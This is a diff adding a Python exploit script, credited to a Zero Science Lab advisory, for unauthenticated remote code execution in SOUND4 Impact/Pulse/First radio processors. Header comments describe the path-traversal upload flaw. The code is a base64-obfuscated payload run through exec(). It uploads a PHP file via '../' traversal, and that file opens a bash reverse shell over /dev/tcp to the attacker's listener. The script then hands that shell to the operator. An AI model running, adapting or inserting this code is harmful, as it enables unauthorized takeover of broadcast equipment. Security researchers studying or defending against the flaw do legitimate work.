@@ -1,0 +1,223 @@
+#!/usr/bin/env python
+#
+#
+# SOUND4 IMPACT/FIRST/PULSE/Eco <=2.x (upload.cgi) Unauthenticated Remote Code Execution
+#
+#
+# Vendor: SOUND4 Ltd.
+# Product web page: https://www.sound4.com | https://www.sound4.biz
+# Affected version: FM/HD Radio Processing:
+#                   Impact/Pulse/First (Version 2: 1.1/2.15)
+#                   Impact/Pulse/First (Version 1: 2.1/1.69)
+#                   Impact/Pulse Eco 1.16
+#                   Voice Processing:
+#                   BigVoice4 1.2
+#                   BigVoice2 1.30
+#                   Web-Audio Streaming:
+#                   Stream 1.1/2.4.29
+#                   Watermarking:
+#                   WM2 (Kantar Media) 1.11
+#
+# Summary: The SOUND4 IMPACT introduces an innovative process - mono and
+# stereo parts of the signal are processed separately to obtain perfect
+# consistency in terms of both sound and level. Therefore, in moving
+# reception, when the FM receiver switches from stereo to mono and back to
+# stereo, the sound variations and changes in level are reduced by over 90%.
+# In the SOUND4 IMPACT processing chain, the stereo expander can be used
+# substantially without any limitations.
+#
+# With its advanced functionalities and impressive versatility, SOUND4
+# PULSE gives clients the ultimate price - performance ratio, providing
+# much more than just a processor. Flexible and powerful, it ensures perfect
+# sound quality and full compatibility with radio broadcasting standards
+# and can be used simultaneously for FM and HD, DAB, DRM or streaming.
+#
+# SOUND4 FIRST provides all the most important functionalities you need
+# in an FM/HD processor and sets the bar high both in terms of performance
+# and affordability. Designed to deliver a sound of uncompromising quality,
+# this tool gives you 2-band processing, a digital stereo generator and an
+# IMPACT Clipper.
+#
+# Desc: SOUND4 products suffer from an unauthenticated remote code execution
+# vulnerability. An attacker can exploit this vulnerability by abusing the
+# firmware upgrade/upload functionality, which contains a path traversal flaw.
+# This allows the attacker to arbitrarily write a malicious file to a location
+# on the system with www-data permissions, which can be executed to gain unauthorized
+# access.
+# ---------------------------------------------------------------------------
+# Starting handler on port 6161.
+# Writing callback file...
+# Connection from 192.168.1.137:58670
+# You got shell.
+# id
+# uid=33(www-data) gid=33(www-data) groups=29(audio),33(www-data)
+# exit
+# *** Connection closed by remote host ***
+# ---------------------------------------------------------------------------
+#
+# Tested on: Apache/2.4.25 (Unix)
+#            OpenSSL/1.0.2k
+#            PHP/7.1.1
+#            GNU/Linux 5.10.43 (armv7l)
+#            GNU/Linux 4.9.228 (armv7l)
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+# Macedonian Information Security Research and Development Laboratory
+# Zero Science Lab - https://www.zeroscience.mk - @zeroscience
+#
+#
+# Advisory ID: ZSL-2022-5741
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2022-5741.php
+#
+#
+# 26.09.2022
+#
+#
+
+import ipaddress as irukandji#--        -----------------------------
+from time import sleep#----------        ----------------------------
+import threading#-----------------        ---------------------------
+import telnetlib#------------------        --------------------------
+import requests#--------------------        -------------------------
+import socket#-----------------------        ------------------------
+import base64#------------------------        -----------------------
+import time#---------------------------        ----------------------
+import sys#-----------------------------        ---------------------
+import re#-------------------------------        --------------------
+importer  = "Y2xhc3MgVmlkZW9LaWxsZWRUaGV"+        "SYWRpb1N0YXI6DQog"
+importer += "ICAgDQogICAgZGVmIF9faW5pdF9f"+        "KHNlbGYpOg0KICAg"
+importer += "ICAgICBzZWxmLnNlY3JldGFnZW50I"+        "D0gIkRqL09sZSIN"
+importer += "CiAgICAgICAgc2VsZi5wYXlsb2FkID"+        "0gTm9uZQ0KICAg"
+importer += "ICAgICBzZWxmLmRlcGxveSA9IE5vbmU"+        "NCiAgICAgICAg"
+importer += "c2VsZi5yaG9zdCA9IE5vbmUNCiAgICA"+        "gICAgc2VsZi5s"
+importer += "aG9zdCA9IE5vbmUNCiAgICAgICAgc2"+        "VsZi5scG9ydCA9"
+importer += "IE5vbmUNCg0KICAgIGRlZiB0aGVfY"+        "XJncyhzZWxmKToN"
+importer += "CiAgICAgICAgaWYgbGVuKHN5cy5h"+        "cmd2KSAhPSA0Og0K"
+importer += "ICAgICAgICAgICAgc2VsZi50aGV"+        "fdXNhZ2UoKQ0KICAg"
+importer += "ICAgICBlbHNlOg0KICAgICAgIC"+        "AgICAgc2VsZi5yaG9z"
+importer += "dCA9IHN5cy5hcmd2WzFdDQogI"+        "CAgICAgICAgICBzZWxm"
+importer += "Lmxob3N0ID0gc3lzLmFyZ3Zb"+        "Ml0NCiAgICAgICAgICAg"
+importer += "IHNlbGYubHBvcnQgPSBpbnQ"+        "oc3lzLmFyZ3ZbM10pDQog"
+importer += "ICAgICAgICAgICBpZiBub3"+        "QgImh0dHAiIGluIHNlbGYu"
+importer += "cmhvc3Q6DQogICAgICAgI"+        "CAgICAgICAgc2VsZi5yaG9z"
+importer += "dCA9ICJodHRwOi8ve30i"+        "LmZvcm1hdChzZWxmLnJob3N0"
+importer += "KQ0KDQogICAgZGVmIHR"+        "oZV91c2FnZShzZWxmKToNCiAg"
+importer += "ICAgICAgc2VsZi50aG"+        "Vfd2hhKCkNCiAgICAgICAgcHJp"
+importer += "bnQoIlVzYWdlOiBwe"+        "XRob24ge30gW3RhcmdldElQOnRh"
+importer += "cmdldFBPUlRdIFts"+        "aXN0ZW5JUF0gW2xpc3RlblBPUlRd"
+importer += "Ii5mb3JtYXQoc3l"+        "zLmFyZ3ZbMF0pKQ0KICAgICAgICBl"
+importer += "eGl0KDApDQoNCi"+        "AgICBkZWYgdGhlX3doYShzZWxmKToN"
+importer += "CiAgICAgICAgd"+        "Gl0bCA9ICIiIg0KICAgICAgICAgL1xf"
+importer += "X19fX18gIF9f"+        "DQogICAgICAgIC8tfiAgICAgLF5+IC8g"
+importer += "X19uDQogICA"+        "gICAgLyAsLS0teCAvXy4tIkwvX18sXFwN"
+importer += "CiAgICAgIC"+        "8tIi4tLS0uXF8uLScvISIgIFwgXFwNCiAg"
+importer += "ICAgIDBcL"+        "zBfX18vICAgeCcgLyAgICApIHwNCiAgICAg"
+importer += "IFwuX19f"+        "X19fLi0nXy57X18uLSJfLl4NCiAgICAgICBg"
+importer += "eF9fX18"+        "sLi0iLC1+KCAuLSINCiAgICAgICAgICBfLi18"
+importer += "ICxeLi"+        "1+ICJcXA0KICAgICBfXy4tfl8sLXwvXC8gICAg"
+importer += "IGBpD"+        "QogICAgLyB1Li1+IC4te1wvICAgICAuLV4tLS4N"
+importer += "CiAg"+        "ICBcLyAgIHZ+ICwtXnguX19fX30tLXIgfA0KICAg"
+importer += "ICAg"+        "ICAvIC8iICAgICAgICAgICAgfCB8DQogICAgICBf"
+importer += "L18vI"+        "CAgICAgICAgICAgICAhX2xfDQogICAgb35fLy8p"
+importer += "ICAgIC"+        "AgICAgICAgIChfXFxffm8NCn5+fn5+fn5+fn5+"
+importer += "fn5+fn5"+        "+fn5+fn5+fn5+fn5+fn5+fn4NCiAgICAgICAg"
+importer += "IiIiDQog"+        "ICAgICAgIHByaW50KHRpdGwpDQoNCiAgICBk"
+importer += "ZWYgdGhl"+        "X3VwbG9hZChzZWxmKToNCiAgICAgICAgcHJp"
+importer += "bnQoIldy"+        "aXRpbmcgY2FsbGJhY2sgZmlsZS4uLiIpDQog"
+importer += "ICAgICAg"+        "IHNlbGYuaGVhZGVycyA9IHsiQ29udGVudC1U"
+importer += "eXBlIiA6"+         "ICJtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3V"
+importer += "uZGFyeT0"+          "tLS0tVGhlTWVudSIsDQogICAgICAgICAgI"
+importer += "CAgICAgI"+            "CAgICAgICAiQWNjZXB0LUxhbmd1YWdlI"
+importer += "iA6ICJlb"+              "i1VUyxlbjtxPTAuOSIsDQogICAgICA"
+importer += "gICAgICA"+                "gICAgICAgICAgICAiQWNjZXB0LUV"
+importer += "uY29kaW5"+                  "nIiA6ICJnemlwLCBkZWZsYXRlI"
+importer += "iwNCiAgI"+                    "CAgICAgICAgICAgICAgICAgI"
+importer += "CAgICJVc"+                      "2VyLUFnZW50IiA6IHNlbGY"
+importer += "uc2VjcmV"+                        "0YWdlbnQsDQogICAgICA"
+importer += "gICAgICAg"+                       "ICAgICAgICAgICAiQ2Fj"
+importer += "aGUtQ29udH"+                      "JvbCIgOiAibWF4LWFnZT"
+importer += "0wIiwgDQogI"+                     "CAgICAgICAgICAgICAgI"
+importer += "CAgICAgICAiQ2"+                   "9ubmVjdGlvbiIgOiAiY2"
+importer += "xvc2UiLA0KICAgI"+                 "CAgICAgICAgICAgICAgI"
+importer += "CAgICAgIkFjY2VwdC"+               "IgOiAiKi8qIn0NCiAgIC"
+importer += "ANCiAgICAgICAgc2VsZ"+             "i5wYXlsb2FkID0gIjw/c"
+importer += "GhwIGV4ZWMoXCIvYmluL2"+          "Jhc2ggLWMgJ2Jhc2ggLWk"
+importer += "gPiAvZGV2L3RjcC8iK3Nlb"+        "GYubGhvc3QrIi8iK3N0cih"
+importer += "zZWxmLmxwb3J0KSsiIDwmM"+        "TtybSBiLnBocCdcIik7Ig0"
+importer += "KDQogICAgICAgIHNlbGYuZ"+        "GVwbG95ICA9ICItLS0tLS1"
+importer += "UaGVNZW51XHJcbkNvbnRlbn"+        "QtRGlzcG9zaXRpb246IGZ"
+importer += "vcm0tZGF0YTsiI3VzDQogICA"+        "gICAgIHNlbGYuZGVwbG9"
+importer += "5ICs9ICIgbmFtZT1cInVwZ2Zp"+        "bGVcIjsgZmlsZW5hbWU"
+importer += "9XCIuLi8uLi8uLi8uLi8uLi8uL"+        "i8iI01lDQogICAgICA"
+importer += "gIHNlbGYuZGVwbG95ICs9ICIuLi"+        "92YXIvd3d3L2IucGh"
+importer += "wXCJcclxuQ29udGVudC1UeXBlOiB"+        "hcHBsaWNhdGlvbi8"
+importer += "iI2NvDQogICAgICAgIHNlbGYuZGVw"+        "bG95ICs9ICJvY3R"
+importer += "ldC1zdHJlYW1cclxuXHJcbiIrc2VsZ"+        "i5wYXlsb2FkKyJ"
+importer += "cclxuLS0tLS0tVGgiIy4uDQogICAgIC"+        "AgIHNlbGYuZGV"
+importer += "wbG95ICs9ICJlTWVudVxyXG5Db250ZW5"+        "0LURpc3Bvc2l"
+importer += "0aW9uOiBmb3JtLWRhdGE7IG5hbWU9XCIi"+        "I24NCiAgICA"
+importer += "gICAgc2VsZi5kZXBsb3kgKz0gInN1Ym1pd"+        "FwiXHJcblx"
+importer += "yXG5EbyBpdFxyXG4tLS0tLS1UaGVNZW51LS"+        "1cclxuIiM"
+importer += "tLS0tLS0NCiAgICANCiAgICAgICAgcmVxdWV"+        "zdHMucG9"
+importer += "zdChzZWxmLnJob3N0KyIvY2dpLWJpbi91cGxv"+        "YWQuY2d"
+importer += "pIiwgaGVhZGVycz1zZWxmLmhlYWRlcnMsIGRhd"+        "GE9c2V"
+importer += "sZi5kZXBsb3kpDQogICAgICAgIHNsZWVwKDEpIC"+        "ANCiA"
+importer += "gICAgICAgcmVxdWVzdHMuZ2V0KHNlbGYucmhvc3Q"+        "rIi9"
+importer += "iLnBocCIpDQoNCiAgICBkZWYgdGhlX3N1YnAoc2Vs"+        "Zik"
+importer += "6DQogICAgICAgIGtvbmFjID0gdGhyZWFkaW5nLlRoc"+        "mV"
+importer += "hZChuYW1lPSJaU0wiLCB0YXJnZXQ9c2VsZi50aGVfZW"+        "F"
+importer += "yKQ0KICAgICAgICBrb25hYy5zdGFydCgpDQogICAgIC"+        "A"
+importer += "gIHNsZWVwKDEpDQogICAgICAgIHNlbGYudGhlX3VwbG"+        "9"
+importer += "hZCgpDQoNCiAgICBkZWYgdGhlX2VhcihzZWxmKToNC"+        "iA"
+importer += "gICAgICAgdGVsbmV0dXMgPSB0ZWxuZXRsaWIuVGVs"+        "bmV"
+importer += "0KCkNCiAgICAgICAgcHJpbnQoIlN0YXJ0aW5nIGh"+        "hbmR"
+importer += "sZXIgb24gcG9ydCB7fS4iLmZvcm1hdChzZWxmLm"+        "xwb3J"
+importer += "0KSkNCiAgICAgICAgcyA9IHNvY2tldC5zb2NrZ"+        "XQoc29"
+importer += "ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NU"+        "UkVBTSk"
+importer += "NCiAgICAgICAgcy5iaW5kKCgiMC4wLjAuMCI"+        "sIHNlbGY"
+importer += "ubHBvcnQpKQ0KICAgICAgICB3aGlsZSBUcn"+        "VlOg0KICA"
+importer += "gICAgICAgICAgdHJ5Og0KICAgICAgICAgI"+        "CAgICAgIHM"
+importer += "uc2V0dGltZW91dCg3KQ0KICAgICAgICAg"+        "ICAgICAgIHM"
+importer += "ubGlzdGVuKDEpDQogICAgICAgICAgICA"+        "gICAgY29ubiw"
+importer += "gYWRkciA9IHMuYWNjZXB0KCkNCiAgIC"+        "AgICAgICAgICA"
+importer += "gICBwcmludCgiQ29ubmVjdGlvbiBmc"+        "m9tIHt9Ont9Ii5"
+importer += "mb3JtYXQoYWRkclswXSwgYWRkclsx"+        "XSkpDQogICAgICA"
+importer += "gICAgICAgICAgdGVsbmV0dXMuc29"+        "jayA9IGNvbm4NCiA"
+importer += "gICAgICAgICAgIGV4Y2VwdCBzb2"+        "NrZXQudGltZW91dCB"
+importer += "hcyBwOg0KICAgICAgICAgICAgI"+        "CAgIHByaW50KCJIbW1"
+importer += "tICh7bXNnfSkiLmZvcm1hdCht"+        "c2c9cCkpDQogICAgICA"
+importer += "gICAgICAgICAgcy5jbG9zZSg"+        "pDQogICAgICAgICAgICA"
+importer += "gICAgZXhpdCgwKQ0KICAgIC"+        "AgICAgICAgYnJlYWsNCg0"
+importer += "KICAgICAgICBwcmludCgiW"+        "W91IGdvdCBzaGVsbC4iKQ0"
+importer += "KICAgICAgICB0ZWxuZXR1"+        "cy5pbnRlcmFjdCgpDQogICA"
+importer += "gICAgIGNvbm4uY2xvc2U"+        "oKQ0KDQogICAgZGVmIG1haW4"
+importer += "oc2VsZik6DQogICAgIC"+        "AgIHNlbGYudGhlX2FyZ3MoKQ0"
+importer += "KICAgICAgICBzZWxmL"+        "nRoZV9zdWJwKCkNCg0KaWYgX19"
+importer += "uYW1lX18gPT0gJ19f"+        "bWFpbl9fJzoNCiAgICBWaWRlb0t"
+importer += "pbGxlZFRoZVJhZGl"+        "vU3RhcigpLm1haW4oKQ0K"######"
+retropmi  = "U2VjdXJpdHkgaXM"+        "gbGlrZSBhbiBvbmlvbjogdGhlIG1v"
+retropmi += "cmUgbGF5ZXJzIH"+        "lvdSBwZWVsLCB0aGUgbW9yZSBpdCBz"
+retropmi += "dGlua3Mu"####"+        "###############################"
+
+radio_code = base64.b64decode(importer)
+
+curves = [ord(c) for c in retropmi]
+
+maxi = max(curves)
+mini = min(curves)
+code_range = maxi - mini
+
+jcoords = [int(20 * (1 - (codeio - mini) / code_range)) for codeio in curves]
+
+for y in range(20, 0, -1):
+    line = ""
+    for x in range(len(jcoords)):
+        if jcoords[x] >= y:
+            line += "-"
+        else:
+            line += " "
+    print(line)
+    time.sleep(0.03/1.337)
+
+exec(radio_code)
